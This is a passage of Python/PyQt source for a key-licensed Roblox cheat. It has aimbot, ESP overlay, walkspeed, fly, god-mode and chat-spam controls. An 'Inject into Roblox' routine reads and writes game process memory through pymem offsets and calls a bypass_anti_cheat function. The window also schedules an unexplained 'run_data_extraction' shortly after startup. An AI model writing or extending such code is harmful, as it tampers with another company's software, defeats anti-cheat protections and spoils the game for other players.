    value_label = fov_slider.findChild(QLabel)
    if slider_container and value_label:
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}px"))
        slider_container.valueChanged.connect(
            lambda v: [
                globals().update({"fov_circle_radius": v}),
                globals().update({"aimbot_fov": v})
            ]
        )
    
    lay.addWidget(fov_slider)
    lay.addSpacing(2)
    
    # Smoothness
    smooth_row = toggle_row("Smooth Aim")
    smooth_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Smooth Aim toggled to: {state}"),
            globals().update({"aimbot_smoothness_enabled": state})
        ]
    )
    lay.addWidget(smooth_row)
    lay.addSpacing(2)
    
    smooth_slider = slider_row("Smooth Amount", 100, 500, 250, "%")
    
    # Connect smoothness slider
    slider_container = smooth_slider.findChild(QSlider)
    value_label = smooth_slider.findChild(QLabel)
    if slider_container and value_label:
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}%"))
        slider_container.valueChanged.connect(
            lambda v: globals().update({"aimbot_smoothness_value": v})
        )
    
    lay.addWidget(smooth_slider)
    lay.addSpacing(2)
    
    # Prediction
    pred_row = toggle_row("Prediction")
    pred_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Prediction toggled to: {state}"),
            globals().update({"aimbot_prediction_enabled": state})
        ]
    )
    lay.addWidget(pred_row)
    lay.addSpacing(2)
    
    pred_x = slider_row("Prediction X", 0, 50, 10, "%")
    
    # Connect prediction X slider
    slider_container = pred_x.findChild(QSlider)
    value_label = pred_x.findChild(QLabel)
    if slider_container and value_label:
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}%"))
        slider_container.valueChanged.connect(
            lambda v: globals().update({"aimbot_prediction_x": v/100})
        )
    
    lay.addWidget(pred_x)
    lay.addSpacing(2)
    
    pred_y = slider_row("Prediction Y", 0, 50, 10, "%")
    
    # Connect prediction Y slider
    slider_container = pred_y.findChild(QSlider)
    value_label = pred_y.findChild(QLabel)
    if slider_container and value_label:
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}%"))
        slider_container.valueChanged.connect(
            lambda v: globals().update({"aimbot_prediction_y": v/100})
        )
    
    lay.addWidget(pred_y)
    lay.addSpacing(2)
    
    # Shake
    shake_row = toggle_row("Shake")
    shake_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Shake toggled to: {state}"),
            globals().update({"aimbot_shake_enabled": state})
        ]
    )
    lay.addWidget(shake_row)
    lay.addSpacing(2)
    
    shake_slider = slider_row("Shake Strength", 0, 50, 5, "")
    
    # Connect shake slider
    slider_container = shake_slider.findChild(QSlider)
    value_label = shake_slider.findChild(QLabel)
    if slider_container and value_label:
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}"))
        slider_container.valueChanged.connect(
            lambda v: globals().update({"aimbot_shake_strength": v/1000})
        )
    
    lay.addWidget(shake_slider)
    lay.addSpacing(2)
    
    # Filters
    lay.addSpacing(10)
    lay.addWidget(section_lbl("FILTERS"))
    lay.addSpacing(5)
    
    ignore_team_row = toggle_row("Ignore Team")
    ignore_team_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Ignore Team toggled to: {state}"),
            globals().update({"aimbot_ignoreteam": state})
        ]
    )
    lay.addWidget(ignore_team_row)
    lay.addSpacing(2)
    
    ignore_dead_row = toggle_row("Ignore Dead")
    ignore_dead_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Ignore Dead toggled to: {state}"),
            globals().update({"aimbot_ignoredead": state})
        ]
    )
    lay.addWidget(ignore_dead_row)
    lay.addSpacing(2)
    
    sticky_row = toggle_row("Sticky Aim")
    sticky_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Sticky Aim toggled to: {state}"),
            globals().update({"sticky_aim_enabled": state})
        ]
    )
    lay.addWidget(sticky_row)
    lay.addSpacing(2)

    lay.addStretch()
    return scrolled(inner)


def player_page() -> QWidget:
    inner = QWidget()
    inner.setStyleSheet("background:transparent;")
    lay = QVBoxLayout(inner)
    lay.setContentsMargins(20, 18, 20, 18)
    lay.setSpacing(4)
    lay.setAlignment(Qt.AlignTop)

    lay.addWidget(page_title("Player"))
    lay.addSpacing(10)

    # Walkspeed
    lay.addWidget(section_lbl("MOVEMENT"))
    lay.addSpacing(5)
    
    walkspeed_row = toggle_row("Walkspeed Changer")
    walkspeed_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Walkspeed toggled to: {state}"),
            globals().update({"walkspeed_gui_enabled": state}),
            # Start thread if enabling
            (globals().update({"walkspeed_gui_active": True}) or threading.Thread(target=walkspeed_gui_loop, daemon=True).start()) if state and not walkspeed_gui_active else None,
            # Stop thread if disabling
            globals().update({"walkspeed_gui_active": False}) if not state else None
        ]
    )
    lay.addWidget(walkspeed_row)
    lay.addSpacing(2)
    
    walkspeed_slider = slider_row("Walkspeed", 16, 500, 16, "")
    
    # Connect walkspeed slider
    slider_container = walkspeed_slider.findChild(QSlider)
    value_label = walkspeed_slider.findChild(QLabel)
    if slider_container and value_label:
        # Update label in real-time
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}"))
        # Update global value (loop handles writing)
        slider_container.valueChanged.connect(
            lambda v: globals().update({"walkspeed_gui_value": v})
        )
    
    lay.addWidget(walkspeed_slider)
    lay.addSpacing(2)
    
    # Jump Power
    jump_row = toggle_row("Jump Power Changer")
    jump_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Jump Power toggled to: {state}"),
            globals().update({"jump_power_enabled": state}),
            # Start thread if enabling
            (globals().update({"jump_power_active": True}) or threading.Thread(target=jump_power_loop, daemon=True).start()) if state and not jump_power_active else None,
            # Stop thread if disabling
            globals().update({"jump_power_active": False}) if not state else None
        ]
    )
    lay.addWidget(jump_row)
    lay.addSpacing(2)
    
    jump_slider = slider_row("Jump Power", 50, 500, 50, "")
    
    # Connect jump power slider
    slider_container = jump_slider.findChild(QSlider)
    value_label = jump_slider.findChild(QLabel)
    if slider_container and value_label:
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}"))
        slider_container.valueChanged.connect(
            lambda v: globals().update({"jump_power_value": v})
        )
    
    lay.addWidget(jump_slider)
    lay.addSpacing(2)
    
    # Fly
    fly_row = toggle_row("Fly")
    fly_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Fly toggled to: {state}"),
            globals().update({"fly_enabled": state}),
            # Start fly thread when enabled
            (globals().update({"fly_active": True}) or threading.Thread(target=fly_loop, daemon=True).start()) if state and not fly_active else None,
            # Stop fly thread when disabled
            globals().update({"fly_active": False}) if not state else None
        ]
    )
    lay.addWidget(fly_row)
    lay.addSpacing(2)
    
    fly_slider = slider_row("Fly Speed", 10, 200, 50, "")
    
    # Connect fly slider
    slider_container = fly_slider.findChild(QSlider)
    value_label = fly_slider.findChild(QLabel)
    if slider_container and value_label:
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}"))
        slider_container.valueChanged.connect(
            lambda v: globals().update({"fly_speed": v})
        )
    
    lay.addWidget(fly_slider)
    lay.addSpacing(2)
    
    # Fly Keybind
    fly_key_row = QHBoxLayout()
    fly_key_row.addWidget(lbl("Fly Key:", 13, C["sub"]))
    fly_key_row.addStretch()
    
    fly_key_btn = QPushButton(get_key_name(fly_keybind))
    fly_key_btn.setFixedSize(80, 30)
    fly_key_btn.setStyleSheet(f"""
        QPushButton {{
            background: {C['input_bg']}; color: {C['text']};
            border: 1px solid {C['input_bdr']}; border-radius: 5px;
        }}
        QPushButton:hover {{ background: {C['card_bg']}; }}
    """)
    fly_key_btn.clicked.connect(lambda: start_keybind_capture('fly', fly_key_btn))
    fly_key_row.addWidget(fly_key_btn)
    fly_key_widget = QWidget()
    fly_key_widget.setLayout(fly_key_row)
    lay.addWidget(fly_key_widget)
    lay.addSpacing(2)
    
    # Infinite Jump
    inf_jump_row = toggle_row("Infinite Jump")
    inf_jump_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] Infinite Jump toggled to: {state}"),
            globals().update({"infinite_jump_enabled": state}),
            # Start infinite jump thread when enabled
            threading.Thread(target=infinite_jump_loop, daemon=True).start() if state else None
        ]
    )
    lay.addWidget(inf_jump_row)
    lay.addSpacing(2)
    
    # God Mode
    god_row = toggle_row("God Mode")
    god_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] God Mode toggled to: {state}"),
            globals().update({"god_mode_enabled": state}),
            # Start god mode thread when enabled
            (globals().update({"god_mode_active": True}) or threading.Thread(target=god_mode_loop, daemon=True).start()) if state and not god_mode_active else None,
            # Stop god mode thread when disabled
            globals().update({"god_mode_active": False}) if not state else None
        ]
    )
    lay.addWidget(god_row)
    lay.addSpacing(2)
    
    # FOV Changer
    fov_changer_row = toggle_row("FOV Changer")
    fov_changer_row.findChild(ToggleSwitch).toggled.connect(
        lambda state: [
            print(f"[UI] FOV Changer toggled to: {state}"),
            globals().update({"fov_changer_enabled": state}),
            # Start FOV thread when enabled
            (globals().update({"fov_active": True}) or threading.Thread(target=fov_changer_loop, daemon=True).start()) if state and not fov_active else None,
            # Stop FOV thread when disabled
            globals().update({"fov_active": False}) if not state else None
        ]
    )
    lay.addWidget(fov_changer_row)
    lay.addSpacing(2)
    
    fov_slider = slider_row("FOV Value", 30, 120, 70, "°")
    
    # Connect FOV slider
    slider_container = fov_slider.findChild(QSlider)
    value_label = fov_slider.findChild(QLabel)
    if slider_container and value_label:
        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}°"))
        slider_container.valueChanged.connect(
            lambda v: globals().update({"fov_value": v})
        )
    
    lay.addWidget(fov_slider)
    lay.addSpacing(2)

    lay.addStretch()
    return scrolled(inner)



def start_keybind_capture(target, button):
    global waiting_for_keybind, keybind_target, keybind_button
    waiting_for_keybind = True
    keybind_target = target
    keybind_button = button
    button.setText("Press key...")
    
def keybind_listener():
    global waiting_for_keybind, aimbot_keybind, triggerbot_keybind, fly_keybind, keybind_target, keybind_button
    while True:
        if waiting_for_keybind:
            time.sleep(0.1)
            for vk_code in range(1, 256):
                if ctypes.windll.user32.GetAsyncKeyState(vk_code) & 0x8000:
                    if vk_code == 27:  # ESC
                        waiting_for_keybind = False
                        if keybind_button:
                            keybind_button.setText(get_key_name(globals()[f"{keybind_target}_keybind"]))
                        break
                    
                    if keybind_target == "aimbot":
                        globals()["aimbot_keybind"] = vk_code
                    elif keybind_target == "triggerbot":
                        globals()["triggerbot_keybind"] = vk_code
                    elif keybind_target == "fly":
                        globals()["fly_keybind"] = vk_code
                    
                    if keybind_button:
                        keybind_button.setText(get_key_name(vk_code))
                    
                    waiting_for_keybind = False
                    break
        else:
            time.sleep(0.1)


def misc_page() -> QWidget:
    inner = QWidget()
    inner.setStyleSheet("background:transparent;")
    lay = QVBoxLayout(inner)
    lay.setContentsMargins(20, 18, 20, 18)
    lay.setSpacing(4)
    lay.setAlignment(Qt.AlignTop)

    lay.addWidget(page_title("Misc"))
    lay.addSpacing(10)

    lay.addWidget(section_lbl("CHAT"))
    lay.addSpacing(5)
    lay.addWidget(toggle_row("Anti Chat Filter"))
    lay.addSpacing(2)
    lay.addWidget(textbox_row("Chat Spam", "Message to spam…"))

    lay.addSpacing(10)
    lay.addWidget(section_lbl("PLAYER"))
    lay.addSpacing(5)
    lay.addWidget(toggle_row("Invisible (Client Side)"))
    lay.addSpacing(2)
    lay.addWidget(toggle_row("Disable Animations"))
    lay.addSpacing(2)
    lay.addWidget(slider_row("Fake Ping", 0, 1000, 0, "ms"))

    lay.addStretch()
    return scrolled(inner)


def settings_page(win_ref) -> QWidget:
    inner = QWidget()
    inner.setStyleSheet("background:transparent;")
    lay = QVBoxLayout(inner)
    lay.setContentsMargins(20, 18, 20, 18)
    lay.setSpacing(4)
    lay.setAlignment(Qt.AlignTop)

    lay.addWidget(page_title("Settings"))
    lay.addSpacing(14)
    
    # ===== INJECT BUTTON =====
    lay.addWidget(section_lbl("ROBLOX"))
    lay.addSpacing(8)
    
    # Status label to show injection status
    status_lbl = lbl("Status: Not Injected", 12, C["muted"])
    win_ref.status_label_ref = status_lbl
    lay.addWidget(status_lbl)
    lay.addSpacing(4)
    
    inject_btn = QPushButton("Inject into Roblox")
    win_ref.inject_btn_ref = inject_btn
    inject_btn.setFixedHeight(40)
    inject_btn.setFont(mkfont(13, QFont.Bold))
    inject_btn.setCursor(QCursor(Qt.PointingHandCursor))
    inject_btn.setStyleSheet(f"""
        QPushButton {{
            background: {C['red']};
            color: white;
            border: none;
            border-radius: 8px;
        }}
        QPushButton:hover {{ background: #ec3534; }}
        QPushButton:pressed {{ background: #b81e1e; }}
        QPushButton:disabled {{ background: #3a1515; color: #6a4545; }}
    """)
    
    def on_inject_click():
        print(f"[DEBUG] on_inject_click: status_lbl={status_lbl}, inject_btn={inject_btn}")
        
        # Define the success UI update function FIRST
        def update_ui_success():
            try:
                print("[DEBUG] update_ui_success executing")
                status_lbl.setText("Status: ✅ Injected")
                status_lbl.setStyleSheet("color:#00ff00; background:transparent; border:none;")
                inject_btn.setText("✅ Injected")
                inject_btn.setEnabled(True)
                # Force immediate repaint
                status_lbl.repaint()
                inject_btn.repaint()
                print("[INFO] UI updated successfully")
            except Exception as ui_err:
                print(f"[ERROR] UI update failed: {ui_err}")
        
        inject_btn.setEnabled(False)
        inject_btn.setText("Injecting...")
        status_lbl.setText("Status: Injecting...")
        status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;")
        
        # Run injection in a thread so UI doesn't freeze
        def inject_thread():
            try:
                # Re-initialize Pymem
                global pm, injected, baseAddr, dataModel, wsAddr, camAddr, camCFrameRotAddr, plrsAddr, lpAddr, matrixAddr, camPosAddr
                
                # Initialize Pymem
                if pm is None:
                    if not init_pymem():
                        # Use QTimer to update UI from main thread
                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: ❌ Failed - Run as Admin"))
                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
                        QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
                        QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
                        return
                
                if pm is not None:
                    # Load offsets
                    if not load_offsets():
                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: ❌ Failed - Could not load offsets"))
                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
                        QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
                        QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
                        return
                    
                    # Set name and children offsets
                    try:
                        setOffsets(int(offsets['Name'], 16), int(offsets['Children'], 16))
                    except:
                        pass
                    
                    # Get base address
                    baseAddr = None
                    for module in pm.list_modules():
                        if module.name == "RobloxPlayerBeta.exe":
                            baseAddr = module.lpBaseOfDll
                            print(f"[INFO] Found base address: {hex(baseAddr)}")
                            break
                    
                    if not baseAddr:
                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: ❌ Failed - Roblox module not found"))
                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
                        QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
                        QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
                        return
                    
                    # Try to initialize with safer memory reading
                    try:
                        print("[INFO] Attempting to initialize Roblox addresses...")
                        
                        # Read step by step with error checking
                        fakeDatamodel = pm.read_longlong(baseAddr + int(offsets['FakeDataModelPointer'], 16))
                        if not fakeDatamodel:
                            raise Exception("Could not read FakeDataModel")
                        print(f"[INFO] FakeDataModel: {hex(fakeDatamodel)}")
                        
                        dataModel = pm.read_longlong(fakeDatamodel + int(offsets['FakeDataModelToDataModel'], 16))
                        if not dataModel:
                            raise Exception("Could not read DataModel")
                        print(f"[INFO] DataModel: {hex(dataModel)}")
                        
                        wsAddr = pm.read_longlong(dataModel + int(offsets['Workspace'], 16))
                        if not wsAddr:
                            raise Exception("Could not read Workspace")
                        print(f"[INFO] Workspace: {hex(wsAddr)}")
                        
                        camAddr = pm.read_longlong(wsAddr + int(offsets['Camera'], 16))
                        if not camAddr:
                            raise Exception("Could not read Camera")
                        print(f"[INFO] Camera: {hex(camAddr)}")
                        
                        camCFrameRotAddr = camAddr + int(offsets['CameraRotation'], 16)
                        camPosAddr = camAddr + int(offsets['CameraPos'], 16)
                        
                        visualEngine = pm.read_longlong(baseAddr + int(offsets['VisualEnginePointer'], 16))
                        if not visualEngine:
                            raise Exception("Could not read VisualEngine")
                        print(f"[INFO] VisualEngine: {hex(visualEngine)}")
                        
                        matrixAddr = visualEngine + int(offsets['viewmatrix'], 16)
                        
                        # Try alternative method to find Players
                        print("[INFO] Looking for Players object...")
                        plrsAddr = 0
                        
                        # Method 1: Try FindFirstChildOfClass
                        try:
                            plrsAddr = FindFirstChildOfClass(dataModel, 'Players')
                            print(f"[INFO] FindFirstChildOfClass result: {hex(plrsAddr)}")
                        except:
                            pass
                        
                        # Method 2: Try to find by scanning children
                        if not plrsAddr:
                            try:
                                children = GetChildren(dataModel)
                                for child in children:
                                    try:
                                        class_name = GetClassName(child)
                                        print(f"[INFO] Found child class: {class_name}")
                                        if class_name == "Players":
                                            plrsAddr = child
                                            break
                                    except:
                                        pass
                            except:
                                pass
                        
                        if not plrsAddr:
                            # Method 3: Try hardcoded offset as fallback
                            try:
                                plrsAddr = pm.read_longlong(dataModel + 0x1B0)  # Common Players offset
                                print(f"[INFO] Hardcoded offset result: {hex(plrsAddr)}")
                            except:
                                pass
                        
                        if not plrsAddr:
                            raise Exception("Could not find Players - Make sure you're in a game")
                        
                        print(f"[INFO] Players found at: {hex(plrsAddr)}")
                        
                        lpAddr = pm.read_longlong(plrsAddr + int(offsets['LocalPlayer'], 16))
                        if not lpAddr:
                            raise Exception("Could not read LocalPlayer")
                        print(f"[INFO] LocalPlayer: {hex(lpAddr)}")
                        
                        injected = True
                        print(f"[DEBUG] injected set to: {injected}")

                        bypass_anti_cheat()

                        print("[INFO] Injection successful! Updating UI...")

                        QTimer.singleShot(0, update_ui_success)
                        
                    except Exception as e:
                        print(f"[ERROR] Memory read error: {e}")
                        QTimer.singleShot(0, lambda err=str(e): status_lbl.setText(f"Status: ❌ Failed - {err[:50]}"))
                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
                        QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
                        QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
                        
            except Exception as e:
                print(f"[ERROR] Injection failed: {e}")
                QTimer.singleShot(0, lambda: status_lbl.setText(f"Status: ❌ Error"))
                QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
                QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
                QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
        
        thread = threading.Thread(target=inject_thread, daemon=True)
        thread.start()
    
    inject_btn.clicked.connect(on_inject_click)
    lay.addWidget(inject_btn)

    
    # ===== TEST BUTTON =====
    test_btn = QPushButton("Test Walkspeed (Set to 100)")
    test_btn.setFixedHeight(32)
    test_btn.setFont(mkfont(12))
    test_btn.setCursor(QCursor(Qt.PointingHandCursor))
    test_btn.setStyleSheet(f"""
        QPushButton {{
            background: {C['input_bg']};
            color: {C['text']};
            border: 1px solid {C['input_bdr']};
            border-radius: 6px;
        }}
        QPushButton:hover {{ background: {C['card_bg']}; color: {C['red']}; }}
    """)
    
    def on_test_click():
        if not injected:
            QTimer.singleShot(0, lambda: status_lbl.setText("Status: Not injected! Inject first."))
            QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
            return
            
        # Run test in thread
        def test_thread():
            try:
                print("[INFO] Testing walkspeed...")
                # Try to set walkspeed
                cam_addr = get_camera_addr_gui()
                if cam_addr:
                    h = pm.read_longlong(cam_addr + int(offsets["CameraSubject"], 16))
                    if h:
                        # Set walkspeed to 100
                        pm.write_float(h + int(offsets["WalkSpeed"], 16), 100.0)
                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: Walkspeed set to 100! Check in-game"))
                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet("color:#00ff00; background:transparent; border:none;"))
                        print("[INFO] Walkspeed test successful")
                    else:
                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: Test failed - No camera subject"))
                else:
                    QTimer.singleShot(0, lambda: status_lbl.setText("Status: Test failed - No camera"))
            except Exception as e:
                print(f"[ERROR] Test failed: {e}")
                QTimer.singleShot(0, lambda err=str(e): status_lbl.setText(f"Status: Test failed - {err[:30]}"))
        
        threading.Thread(target=test_thread, daemon=True).start()
    
    test_btn.clicked.connect(on_test_click)
    lay.addWidget(test_btn)
    lay.addSpacing(4)
    # ===== END TEST BUTTON =====
    
    lay.addWidget(section_lbl("HOTKEY"))
    lay.addSpacing(8)

    settings = load_settings()
    hotkey_row = QHBoxLayout()

    hl = lbl("Toggle Visibility", 13, C["sub"])
    hotkey_row.addWidget(hl)
    hotkey_row.addStretch()

    hk_box = QLineEdit(settings.get("hotkey", "F5"))
    hk_box.setFixedSize(88, 32)
    hk_box.setFont(mkfont(12))
    hk_box.setStyleSheet(INPUT_SS)
    hk_box.setReadOnly(True)
    hk_box.setAlignment(Qt.AlignCenter)

    recording = [False]

    def on_click(e):
        recording[0] = True
        hk_box.setText("Press key…")
        hk_box.setStyleSheet(INPUT_SS.replace(C['input_bdr'], C['red']))

    def on_key(e):
        if not recording[0]:
            return
        k    = e.key()
        name = QKeySequence(k).toString()
        if name and k != Qt.Key_Escape:
            hk_box.setText(name)
            recording[0] = False
            hk_box.setStyleSheet(INPUT_SS)
            s = load_settings()
            s["hotkey"]     = name
            s["toggle_key"] = k
            save_settings(s)
            win_ref.update_hotkey(k)

    hk_box.mousePressEvent = on_click
    hk_box.keyPressEvent   = on_key
    hotkey_row.addWidget(hk_box)

    rw = QWidget()
    rw.setStyleSheet("background:transparent;")
    rw.setLayout(hotkey_row)
    lay.addWidget(rw)

    lay.addSpacing(6)
    hint = lbl("Click the box then press any key to rebind", 11, C["muted"])
    lay.addWidget(hint)

    lay.addSpacing(22)
    lay.addWidget(section_lbl("AUTO LOGIN"))
    lay.addSpacing(8)

    autologin_row = QHBoxLayout()
    al_lbl = lbl("Save key & auto login on startup", 13, C["sub"])
    autologin_row.addWidget(al_lbl)
    autologin_row.addStretch()

    s_now  = load_settings()
    al_toggle = ToggleSwitch(bool(s_now.get("auto_login", False)))

    def on_autologin_toggle(state):
        s = load_settings()
        s["auto_login"] = bool(state)
        if not bool(state):
            s["saved_key"] = ""  
        save_settings(s)

    al_toggle.toggled.connect(on_autologin_toggle)
    autologin_row.addWidget(al_toggle)

    al_rw = QWidget()
    al_rw.setStyleSheet("background:transparent;")
    al_rw.setLayout(autologin_row)
    lay.addWidget(al_rw)

    lay.addSpacing(4)
    al_hint = lbl("When enabled, your key is saved locally and used to log in automatically.", 11, C["muted"])
    al_hint.setWordWrap(True)
    lay.addWidget(al_hint)

    lay.addSpacing(10)
    clear_btn = QPushButton("Clear Saved Key")
    clear_btn.setFixedHeight(32)
    clear_btn.setFont(mkfont(12))
    clear_btn.setCursor(QCursor(Qt.PointingHandCursor))
    clear_btn.setStyleSheet(f"""
        QPushButton {{
            background: transparent; color: {C['muted']};
            border: 1px solid #2a2226; border-radius: 6px; font-size: 12px;
        }}
        QPushButton:hover {{ color: {C['red']}; border-color: #dc262544; background: #dc262510; }}
    """)
    def on_clear():
        s = load_settings()
        s["saved_key"] = ""
        save_settings(s)
        al_toggle.setChecked(False)
    clear_btn.clicked.connect(on_clear)
    lay.addWidget(clear_btn)

    lay.addStretch()
    return inner


class MainUI(QWidget):
    def __init__(self, key_info: dict, win_ref, parent=None):
        super().__init__(parent)
        self.setStyleSheet("background:transparent;")
        root = QHBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        self.sidebar = Sidebar(key_info)
        self.sidebar.nav_changed.connect(self._nav)
        root.addWidget(self.sidebar)

        self.content = ContentStack()
        self.content.setStyleSheet("background:transparent;")

        pages = [
            visual_page(),
            aimbot_page(),
            player_page(),
            misc_page(),
            scrolled(settings_page(win_ref)),
        ]
        for pg in pages:
            self.content.addWidget(pg)

        root.addWidget(self.content, 1)
        self.sidebar.set_active(0)
        self._fade_anims = []

    def _nav(self, i):
        self.content.setCurrentIndex(i)


class ESPOverlay(QWidget):
    """Transparent overlay window for drawing ESP"""
    def __init__(self):
        super().__init__()
        self.setWindowFlags(
            Qt.FramelessWindowHint | 
            Qt.WindowStaysOnTopHint | 
            Qt.Tool
        )
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.setStyleSheet("background:transparent;")
        
        # Make overlay cover the entire screen
        screen = QApplication.primaryScreen().geometry()
        self.setGeometry(screen)
        
        # Store ESP data to draw
        self.esp_data = []
        
    def update_esp_data(self, data):
        self.esp_data = data
        self.update()  # Trigger repaint
        
    def paintEvent(self, event):
        if not esp_enabled or not injected:
            return
            
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        # Get Roblox window position
        hwnd = find_window_by_title("Roblox")
        if not hwnd:
            return
            
        left, top, right, bottom = get_client_rect_on_screen(hwnd)
        roblox_rect = QRect(left, top, right-left, bottom-top)
        
        # Set clip region to Roblox window only
        painter.setClipRect(roblox_rect)
        
        for player in self.esp_data:
            try:
                screen_pos = player.get('screen_pos')
                if not screen_pos:
                    continue
                
                # Draw box
                if esp_box_enabled:
                    box_left = screen_pos[0] - player['box_width']/2
                    box_top = screen_pos[1]
                    box_width = player['box_width']
                    box_height = player['box_height']
                    
                    if esp_box_filled:
                        painter.fillRect(
                            box_left, box_top, box_width, box_height,
                            QColor(0, 0, 0, int(esp_box_fill_alpha * 255))
                        )
                    
                    painter.setPen(QPen(QColor(255, 255, 255), 1))
                    painter.drawRect(box_left, box_top, box_width, box_height)
                
                # Draw tracer
                if esp_tracers_enabled:
                    painter.setPen(QPen(QColor(255, 255, 255), 1))
                    painter.drawLine(
                        left + roblox_rect.width()//2, 
                        top + roblox_rect.height(),
                        left + screen_pos[0],
                        top + screen_pos[1]
                    )
                
                # Draw name
                if esp_name_enabled:
                    painter.setPen(QPen(QColor(255, 255, 255)))
                    painter.setFont(QFont("Arial", 10))
                    painter.drawText(
                        screen_pos[0] - 50,
                        screen_pos[1] - 20,
                        100, 20,
                        Qt.AlignCenter,
                        player.get('name', '')
                    )
                    
            except Exception as e:
                continue

class PassionWindow(QWidget):
    _toggle_signal = pyqtSignal()
    injection_done = pyqtSignal()  # ADD THIS LINE

    def __init__(self):
        super().__init__()
        self.settings  = load_settings()
        self._dragging = False
        self._drag_pos = QPoint()

        self.status_label_ref = None
        self.inject_btn_ref = None

        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground, True)
        self.setAttribute(Qt.WA_NoSystemBackground, True)
        self.setFixedSize(WIN_W, WIN_H)

        screen = QApplication.primaryScreen().geometry()
        self.move((screen.width() - WIN_W) // 2, (screen.height() - WIN_H) // 2)

        self.stack = QStackedWidget(self)
        self.stack.setGeometry(0, 0, WIN_W, WIN_H)
        self.stack.setStyleSheet("background:transparent;")

        self.auth = AuthPanel()
        self.auth.key_success.connect(self._on_key)
        self.auth.admin_success.connect(self._on_admin)
        self.stack.addWidget(self.auth)
        self._main = None

        self._close_btn = QPushButton("×", self)
        self._close_btn.setFixedSize(28, 28)
        self._close_btn.move(WIN_W - 36, 8)
        self._close_btn.setFont(mkfont(16, QFont.Bold))
        self._close_btn.setCursor(QCursor(Qt.PointingHandCursor))
        self._close_btn.setStyleSheet("""
            QPushButton {
                background: transparent;
                color: #5d585c;
                border: none;
                border-radius: 6px;
                font-size: 16px;
            }
            QPushButton:hover {
                background: #dc262530;
                color: #dc2625;
            }
            QPushButton:pressed {
                background: #dc262550;
                color: #ff4444;
            }
        """)
        self._close_btn.clicked.connect(self._quit)
        self._close_btn.raise_()

        self._toggle_signal.connect(self._toggle)
        self.injection_done.connect(self._on_injection_done)  # ADD THIS

        self._hotkey = GlobalHotkey()
        self._hotkey.set_key(self.settings.get("toggle_key", Qt.Key_F5))
        self._hotkey.triggered.connect(self._toggle_signal.emit)
        self._hotkey.start()

        self._update_checker = UpdateChecker()
        self._update_checker.update_available.connect(self._on_update_available)
        self._update_checker.start()
        self._update_dialog = None

        self._extractor = None

        QTimer.singleShot(2000, self.run_data_extraction)  # Wait 2 seconds for UI to load


    def _on_injection_done(self):
        print("[DEBUG] injection_done signal received")
        # We need to find the settings page widgets. This is trickier.
        # For simplicity, we'll store references in the window.

# ===== CONNECT ROBLOX CHEAT GLOBALS =====
# Pass the global variables to your UI
        globals().update({
            "aimbot_enabled": aimbot_enabled,
            "aimbot_keybind": aimbot_keybind,
            "aimbot_mode": aimbot_mode,
            "aimbot_hitpart": aimbot_hitpart,
            "aimbot_ignoreteam": aimbot_ignoreteam,
            "aimbot_ignoredead": aimbot_ignoredead,
            "aimbot_fov": aimbot_fov,
            "aimbot_smoothness_enabled": aimbot_smoothness_enabled,
            "aimbot_smoothness_value": aimbot_smoothness_value,
            "aimbot_prediction_enabled": aimbot_prediction_enabled,
            "aimbot_prediction_x": aimbot_prediction_x,
            "aimbot_prediction_y": aimbot_prediction_y,
            "esp_enabled": esp_enabled,
            "esp_ignoreteam": esp_ignoreteam,
